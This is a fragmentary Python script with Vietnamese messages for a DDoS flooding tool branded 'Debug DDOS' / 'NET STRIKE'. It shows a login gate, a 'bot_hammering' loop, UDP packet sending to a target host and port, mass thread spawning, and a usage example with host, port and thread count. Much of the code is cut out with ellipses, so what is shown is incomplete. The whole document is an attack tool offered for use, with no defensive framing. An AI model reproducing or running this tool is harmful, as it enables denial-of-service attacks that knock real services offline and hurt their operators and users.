...
while True:
    input_id = input("\033[1;34;40m Nhập ID của bạn: ")
    input_password = input("\033[1;34;40m Nhập mật khẩu của bạn: ")

    if input_id == correct_id and input_password == correct_password:
        print("\033[92m Đăng nhập thành công!")
        ...
        def bot_hammering(url):
            try:
                while True:
                    ...
                    print("\033[94mbot đang bem\033[0m")
                    time.sleep(.1)
            except:
                time.sleep(.1)
                ...
                while True:
                    ...
                    if s.sendto(packet, (host, int(port))):
                        ...
                        print("\033[92m", time.ctime(time.time()),
                              "\033[0m \033[94m <--Gói tin được gửi bởi Debug DDOS --> \033[0m")
                    else:
                        s.shutdown(1)
                        print("\033[91off shod<->down\033[0m")
                    time.sleep(.1)
            except socket.error as e:
                print("\033[91mkhông có kết nối! máy chủ có thể ngừng hoạt động\033[0m")
...
`__| |  \| _|_ / \  <----.     __ / __   \
                    ...
                    <----'    `--' `.__,' \
                      ...
                      \033[1;34;40m DDoS ATTACK \033[0;0m</> \033[0;49;92mNET STRIKE\033[0;0m 
                        Author -> DEBUG </> ABH
        \033[0;49;95m Example -> python3 Debug-DDOS.py -s 127.0.0.1 -p 443 -t 200
        ...
        if __name__ == '__main__':
            ...
            print("\033[94mĐợi đã, tôi đang tìm một số hệ thống bị nhiễm độc\033[0m")
            print("\033[94mVui lòng chờ...\033[0m")
            user_agent()
            my_bots()
            time.sleep(5)
            try:
            ...
            while True:
                for i in range(int(thr)):
                    ...
                    t.daemon = True  # nếu thread tồn tại, nó sẽ tắt
                    t.start()
                    t2 = threading.Thread(target=dos2)
                    t2.daemon = True  # nếu thread tồn tại, nó sẽ tắt
                    t2.start()
                start = time.time()
                # Nhiệm vụ
                item = 0
        ...
        break  # Thoát khỏi vòng lặp nếu thông tin xác thực đúng
    else:
